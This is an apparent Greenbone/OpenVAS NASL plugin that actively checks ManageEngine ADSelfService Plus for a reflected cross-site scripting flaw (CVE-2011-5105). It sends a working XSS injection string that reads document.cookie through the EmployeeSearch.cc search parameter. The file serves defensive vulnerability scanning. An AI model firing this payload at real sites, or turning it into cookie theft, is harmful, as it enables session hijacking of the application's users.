# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

include("plugin_feed_info.inc");

CPE = "cpe:/a:zohocorp:manageengine_adselfservice_plus";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902757");
  script_version("2025-06-13T05:40:07+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2025-06-13 05:40:07 +0000 (Fri, 13 Jun 2025)");
  script_tag(name:"creation_date", value:"2011-11-18 11:15:15 +0530 (Fri, 18 Nov 2011)");

  script_cve_id("CVE-2011-5105");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("ManageEngine ADSelfService Plus <= 4.5 Build 4521 XSS Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl");
  if(FEED_NAME == "GSF" || FEED_NAME == "GEF" || FEED_NAME == "SCM")
    script_dependencies("gsf/gb_manageengine_adselfservice_plus_http_detect.nasl");
  script_require_ports("Services/www", 8888);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"ManageEngine ADSelfService Plus is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an error in corporate directory search
  feature, which allows remote attackers to cause XSS attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to terminate
  javascript variable declarations, escape encapsulation, and append arbitrary javascript code.");

  script_tag(name:"affected", value:"ManageEngine ADSelfServicePlus version 4.5 Build 4521 and
  probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20160310161435/http://jameswebb.me/vulns/vrpth-2011-001.txt");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121070551/http://www.securityfocus.com/archive/1/520562");
  script_xref(name:"URL", value:"https://web.archive.org/web/20210121220138/http://www.securityfocus.com/bid/50717");
  script_xref(name:"URL", value:"https://packetstorm.news/files/id/107093");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("list_array_func.inc");
include("port_service_func.inc");

if(FEED_NAME == "GSF" || FEED_NAME == "GEF" || FEED_NAME == "SCM") {

  if (!port = get_app_port(cpe: CPE, service: "www"))
    exit(0);

  if (!dir = get_app_location(cpe: CPE, port: port))
    exit(0);

  dirs = make_list(dir);

} else {

  port = http_get_port(default: 8888);

  dirs = make_list_unique("/", "/manageengine", http_cgi_dirs(port: port));
}

foreach dir (dirs) {

  if (dir == "/")
    dir = "";

  res = http_get_cache(port: port, item: dir + "/EmployeeSearch.cc");

  if ("<title>ManageEngine - ADSelfService Plus</title>" >!< res)
    continue;

  url = dir + '/EmployeeSearch.cc?searchType=contains&searchBy=' +
              'ALL_FIELDS&searchString=";alert(document.cookie);"';

  if (http_vuln_check(port: port, url: url, pattern: ";alert\(document\.cookie\);", check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
